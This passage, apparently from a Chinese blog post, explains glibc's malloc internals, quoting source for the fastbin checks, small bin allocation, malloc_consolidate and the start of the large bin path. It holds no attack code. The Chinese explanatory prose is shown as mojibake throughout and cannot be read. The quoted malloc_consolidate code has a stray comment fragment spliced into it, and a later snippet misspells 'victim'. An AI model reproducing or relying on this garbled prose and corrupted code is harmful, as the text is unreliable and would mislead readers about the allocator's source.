é™¤è¿™ä¸ª<code>victim</code>ï¼Œç„¶åé‡æ–°æ¥å›å»ã€‚</p><p>ä¸­é—´æœ‰ä¸€ä¸ª<code>check</code>ï¼Œå°±æ˜¯åˆ¤æ–­æ‰€ç»™<code>chunk</code>çš„<code>fastbinY</code>é“¾ä¸Šçš„<code>size</code>æ˜¯å¦ï¼æˆ‘éœ€è¦çš„<code>size</code>ï¼Œå¦‚æœä¸ç›¸ç­‰é‚£ä¹ˆç›´æ¥æŠ¥é”™é€€å‡ºã€‚</p><p>æœ«å°¾ä¹Ÿæœ‰ä¸€ä¸ª<code>check</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Properties of chunks recycled from fastbins</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">do_check_remalloced_chunk</span> <span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!chunk_is_mmapped (p))</span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));</span><br><span class="line">      <span class="keyword">if</span> (chunk_non_main_arena (p))</span><br><span class="line">        assert (av != &amp;main_arena);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        assert (av == &amp;main_arena);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Legal size ... */</span></span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &gt;= MINSIZE);</span><br><span class="line">  <span class="comment">/* ... and alignment */</span></span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));</span><br><span class="line">  <span class="comment">/* chunk is less than MINSIZE more than request */</span></span><br><span class="line">  assert ((<span class="keyword">long</span>) (sz) - (<span class="keyword">long</span>) (s) &gt;= <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="keyword">long</span>) (sz) - (<span class="keyword">long</span>) (s + MINSIZE) &lt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°±æ˜¯<code>check</code>å„ä¸ªæ ‡å¿—ä½ï¼Œä¸€èˆ¬ä¸ä¼šè¢«è§¦å‘ï¼Œæ‰€ä»¥å¯ä»¥ç†è§£ä¸º<code>fast bin</code>åœ¨åˆ†é…çš„æ—¶å€™åªæœ‰è¿™ä¸€ä¸ª<code>check</code>ï¼Œå°±æ˜¯é‚£ä¸ª<code>chunk</code>çš„<code>size</code>ä¸€å®šæ˜¯ç­‰äºæˆ‘ç”³è¯·çš„<code>size</code>çš„ï¼Œè¿‡äº†å°±æŠŠè¿™ä¸ª<code>chunk</code>çš„æŒ‡é’ˆè¿”å›ï¼Œ<code>check</code>æ²¡è¿‡æŠ¥é”™ï¼Œå¦‚æœæ ¹æœ¬éƒ½æ²¡å–åˆ°<code>fast bin</code>ï¼Œé‚£ä¹ˆå°±è¿›è¡Œä¸‹é¢çš„é€»è¾‘äº†ã€‚</p><h3 id="ç¬¬ä¸‰æ®µï¼šsmall-binçš„å¤„ç†"><a href="#ç¬¬ä¸‰æ®µï¼šsmall-binçš„å¤„ç†" class="headerlink" title="ç¬¬ä¸‰æ®µï¼šsmall binçš„å¤„ç†"></a>ç¬¬ä¸‰æ®µï¼šsmall binçš„å¤„ç†</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                  \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ¤æ–­å®ƒåœ¨ä¸åœ¨<code>small bin</code>çš„èŒƒå›´å†…ï¼Œç„¶åå–å‡ºè¿™ä¸ª<code>size</code>çš„<code>small bin</code>çš„æœ€åä¸€ä¸ª<code>chunk</code>ã€‚å®ƒæ·»åŠ æ˜¯åœ¨å¤´éƒ¨æ·»åŠ çš„ï¼Œå› æ­¤æ˜¯ç¬¦åˆå…ˆè¿›å…ˆå‡ºçš„ï¼Œå—¯ã€‚ç„¶åéœ€è¦åˆ¤æ–­ï¼Œå¦‚æœæœ€åä¸€ä¸ªchunk!=è‡ªèº«çš„è¯ï¼Œä¸¤ä¸ªæƒ…å†µï¼šè¦ä¹ˆæ²¡åˆå§‹åŒ–<code>arena</code>ï¼Œé‚£å°±åˆå§‹åŒ–ï¼Œè¦ä¹ˆå®ƒæœ‰ä¸€ä¸ªåˆæ³•çš„å—ã€‚å¦‚æœå®ƒæŒ‡å‘è‡ªèº«é‚£å°±æ²¡å¿…è¦åšè¿‡å¤šçš„åˆ¤æ–­äº†ï¼Œæ²¡æœ‰è¿™ä¸ªå¤§å°çš„<code>small bin</code>ã€‚</p><p>è¿™é‡Œæ˜¯è°ƒç”¨äº†<code>malloc_consolidate</code>å‡½æ•°å»åˆå§‹è¯è¿™ä¸ª<code>arena</code>åˆ†é…å™¨ï¼Œè¯¥å‡½æ•°é€»è¾‘å¦‚ä¸‹ï¼Œä¸é‡ç‚¹è§£è¯»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span><span class="function">mlined version of consolidation code in <span class="title">free</span><span class="params">()</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    maxfb </span>= &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      check_inuse_chunk(av, p);</span><br><span class="line">      nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">      size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">      nextchunk = chunk_at_offset(p, size);</span><br><span class="line">      nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = p-&gt;prev_size;</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">        unlink(av, p, bck, fwd);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">          size += nextsize;</span><br><span class="line">          unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">        unsorted_bin-&gt;fd = p;</span><br><span class="line">        first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">          p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        p-&gt;bk = unsorted_bin;</span><br><span class="line">        p-&gt;fd = first_unsorted;</span><br><span class="line">        set_foot(p, size);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§è‡´æ„æ€å°±æ˜¯æ¸…ç©ºæ‰€æœ‰<code>arena</code>çš„<code>chunk</code>ï¼Œå¯ä»¥çœ‹åˆ°å¤§çš„<code>if</code>æ˜¯åˆ¤æ–­<code>global_max_fast</code>æ˜¯å¦ä¸º0ï¼Œä¸º0åˆ™åˆå§‹åŒ–ï¼Œè°ƒç”¨<code>malloc_init_state</code>å’Œ<code>check_malloc_state</code>å‡½æ•°åˆå§‹åŒ–å †ã€‚å¦åˆ™æŠŠæ‰€æœ‰çš„<code>fast bin</code> å–å‡ºæ¥ï¼Œå…ˆæ¸…é™¤å®ƒä»¬çš„æ ‡å¿—ä½ï¼Œç„¶åæ‰”åˆ°<code>unsorted bin</code>ä¸­å°è¯•å‘å‰åˆå¹¶æˆ–è€…å‘ååˆå¹¶ã€‚</p><p>è¿™ä¸ªå‘¢ï¼Œä¸å¤ªèƒ½è¿è¡Œåˆ°ï¼Œå› ä¸º<code>victim==0</code>çš„æ—¶å€™ï¼Œå¿…è¿˜æ²¡åˆå§‹åŒ–ï¼Œæ²¡åˆå§‹åŒ–åˆ°è¿™é‡Œå°±è¦åˆå§‹åŒ–ï¼Œåˆå§‹åŒ–äº†ä¹‹å<code>victim</code>åˆä¸å¯èƒ½<code>=0</code>äº†ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç†è§£ä¸ºå°±æ˜¯åˆå§‹åŒ–<code>arena</code>çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                          \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ¤æ–­äº†ä¸€ä¸‹<code>victim-&gt;bk-&gt;fd==victim</code>ã€‚ä¹Ÿå°±æ˜¯å½“å‰è¿™ä¸ªå †å—åä¸€ä¸ªå †å—çš„<code>fd</code>æŒ‡é’ˆæ˜¯å¦æŒ‡å‘<code>victim</code>ï¼Œå¦‚æœä¸ç­‰è¯´æ˜é“¾è¡¨è¢«ç ´åäº†ï¼Œé‚£ä¹ˆå°±æŠ¥é”™é€€å‡ºã€‚</p><p>ç„¶å<code>set_inuse_bit_at_offset</code>ï¼Œè¿™ä¸ªä¹Ÿä¸éš¾ç†è§£ï¼Œå› ä¸ºç°åœ¨è¿™ä¸ª<code>small bin</code>è¢«å–å‡ºæ¥äº†è¦ä½¿ç”¨äº†ï¼Œæ‰€ä»¥æˆ‘å¾—è®¾ç½®åä¸€ä¸ªå—çš„<code>prev_inuse</code>ä¸º1è¯æ˜å®ƒä¸æ˜¯ç©ºé—²å †å—äº†ã€‚ç„¶åå°±æ˜¯è¿›è¡Œ<code>unlink</code>æ“ä½œï¼Œå¯¹é“¾è¡¨ç†Ÿæ‚‰çš„åŒå­¦åº”è¯¥çœ‹å¾—æ‡‚ã€‚å¦‚æœæˆ‘è¦åˆ é™¤<code>victim</code>å…ƒç´ é‚£åº”è¯¥æ€ä¹ˆå†™é€»è¾‘ï¼Ÿ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd-&gt;bk=victim-&gt;bk;</span><br><span class="line">victime-&gt;bk-&gt;fd=victim-&gt;fd;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œå‘¢ï¼Œæˆ‘ä»¬å–é“¾çš„æœ€åä¸€ä¸ª<code>chunk</code>ï¼Œä¹Ÿå°±æ˜¯<code>bin-&gt;bk=victim</code>æ‰€ä»¥<code>victim-&gt;fd=bin</code></p><p>ç„¶åå‰é¢æœ‰ä¸€ä¸ªèµ‹å€¼å°±æ˜¯<code>bck=victim-&gt;bk</code>ã€‚å¸¦è¿›ä¸Šé¢çš„å¼å­å°±å¾—åˆ°äº†æºç é‡Œé¢è¿™æ ·çš„å†™æ³•ã€‚</p><p>ç„¶åä¸‹é¢è®¾ç½®<code>main_arena</code>æ ‡å¿—ä½ï¼Œä¸€æ³¢åŒæ ·çš„<code>check</code>ï¼Œç„¶åè¿”å›å†…å­˜æŒ‡é’ˆã€‚ä¹Ÿå°±æ˜¯è¿™é‡Œçš„<code>chunk2mem</code>ï¼Œæˆ‘ä»¬è¿™é‡Œç”¨çš„<code>chunk</code>æŒ‡é’ˆï¼Œä½†æ˜¯å…¶å®æˆ‘ä»¬è¦è¿”å›çš„åº”è¯¥æ˜¯<code>chunk</code>ä¸­æ•°æ®åŸŸçš„æŒ‡é’ˆï¼Œæ‰€ä»¥è¿™é‡Œç”¨äº†è¿™æ ·çš„å®å®šä¹‰åšæ›¿æ¢ã€‚</p><p>ç„¶åå°±æ˜¯æ¸…é™¤<code>data</code>æ•°æ®ï¼Œä½†æ˜¯è¿™ä¸ªä¸€èˆ¬ä¸ä¼šè¢«æ‰§è¡Œï¼Œå‰é¢ä¹Ÿåˆ†æè¿‡äº†ï¼Œç„¶åè¿”å›ã€‚è¿™æ˜¯<code>small bin</code>æ‰¾åˆ°å¯¹åº”çš„<code>chunk</code>çš„é€»è¾‘ï¼Œå¦‚æœ<code>small bin</code>è¿˜æ²¡æ‰¾åˆ°é‚£ä¹ˆæ¥ä¸‹æ¥åº”è¯¥è¦å»æ‰¾<code>large bin</code>äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ç€å¾€ä¸‹è¯»ã€‚</p><h3 id="ç¬¬å››æ®µï¼šåˆ†é…largebinæ—¶çš„æ“ä½œ"><a href="#ç¬¬å››æ®µï¼šåˆ†é…largebinæ—¶çš„æ“ä½œ" class="headerlink" title="ç¬¬å››æ®µï¼šåˆ†é…largebinæ—¶çš„æ“ä½œ"></a>ç¬¬å››æ®µï¼šåˆ†é…largebinæ—¶çš„æ“ä½œ</h3><p>é‚£ä¹ˆå¦‚æœæ²¡æœ‰åœ¨small binçš„èŒƒå›´å†…å‘¢ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ­¥æ¯”è¾ƒè€äººå¯»å‘³ã€‚</p><p>å…ˆè·å–<code>large bin</code>çš„<code>index</code>ï¼Œç„¶åå¦‚æœ<code>fast bin</code>ä¸ä¸ºç©ºï¼Œè°ƒç”¨<code>malloc_consolidate</code>ã€‚è¿™ä¸€æ­¥æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿæˆ‘ä»¬å‰é¢åˆ†æè¿‡<code>malloc_consolidate</code>ï¼Œå¦‚æœæ²¡æœ‰åˆå§‹åŒ–ï¼Œé‚£ä¹ˆåˆå§‹åŒ–ï¼Œå¦‚æœåˆå§‹åŒ–äº†ï¼Œé‚£ä¹ˆåˆå¹¶æ‰€æœ‰çš„<code>fast bin</code>ã€‚ä½†æ˜¯è¿™é‡Œï¼Œéƒ½å·²ç»æœ‰<code>fast bin</code>å­˜åœ¨äº†ï¼Œé‚£ä¹ˆå †æŒ‡å®šå·²ç»åˆå§‹åŒ–äº†ï¼Œæ‰€ä»¥è¿™é‡Œæ‰§è¡Œçš„é€»è¾‘åŸºæœ¬åªèƒ½æ˜¯åˆå¹¶æ‰€æœ‰<code>fast chunk</code>ã€‚ä¸ºä»€ä¹ˆè¦åœ¨æœç´¢<code>large bin</code>çš„æ—¶å€™åˆå¹¶æ‰€æœ‰<code>fast bin</code>å‘¢ï¼Ÿå› ä¸º<code>large bin</code>çš„åŒ¹é…æ–¹å¼æ˜¯æœ€å°èƒ½æ»¡è¶³ï¼Œç„¶ååˆ‡å‰²ã€‚</p><p>è€ƒè™‘è¿™æ ·ä¸€ç§æƒ…å†µï¼š</p><p>å¦‚æœä¸€ä¸ª<code>0x20</code>çš„<code>fast bin</code>å’Œ0x500çš„<code>large bin</code>ç‰©ç†ç›¸é‚»ã€‚æ­¤æ—¶æˆ‘è¦ç”³è¯·ä¸€ä¸ª<code>0x510</code>çš„<code>large bin</code>ï¼Œå¦‚æœæ­¤æ—¶<code>fast bin</code>è¢«åˆå¹¶äº†ï¼Œé‚£ä¹ˆæˆ‘å°±èƒ½æ‰¾åˆ°ä¸€ä¸ª<code>0x520</code>çš„<code>large bin</code>å¹¶æŠŠå®ƒè¿”å›ç»™ç”¨æˆ·ã€‚å¦‚æœæˆ‘ä¸åšè¿™ä¸€æ­¥ï¼Œé‚£ä¹ˆæˆ‘æ‰¾ä¸åˆ°<code>0x510</code>å¤§å°çš„<code>large bin</code>ï¼Œæˆ‘å°±è¢«è¿«åªèƒ½åˆ‡å‰²<code>top_chunk</code>äº†ï¼Œè¿™æ 